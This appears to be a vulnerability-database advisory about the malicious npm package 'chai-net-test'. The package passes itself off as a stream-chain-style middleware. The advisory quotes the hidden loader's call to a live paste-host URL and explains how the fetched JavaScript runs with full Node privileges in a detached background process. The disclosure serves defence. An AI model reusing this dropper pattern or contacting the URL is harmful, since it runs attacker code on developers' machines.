summary: chai-net-test ships a hidden remote-code loader that fetches and executes attacker-controlled JavaScript
details: The package masquerades as a stream-chain / chai-style middleware utility but its exported chain() function silently spawns a detached, stdio-ignored child Node process running src/utils/swap.js. That loader performs axios.get('https://www.jsonkeeper.com/b/LVKHJ', { headers: { 'x-secret-key': '_' } }) and passes response.data.Cookie to new Function.constructor('require', s) and invokes it with the host require, executing arbitrary remote code with full Node privileges. The disguise is deliberate: chain() returns a no-op (req,res,next)=>next() middleware so callers see only benign behavior while the background process pulls and runs whatever JavaScript the anonymous, mutable paste host serves at that moment. The package name and README/source layout closely mirror the legitimate stream-chain package by uhop (with conflation of the chai namespace), with swap.js as the only meaningful behavioral addition — a typosquat lure wrapping a dropper. Any consumer that imports chai-net-test and invokes chain(...) is compromised.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
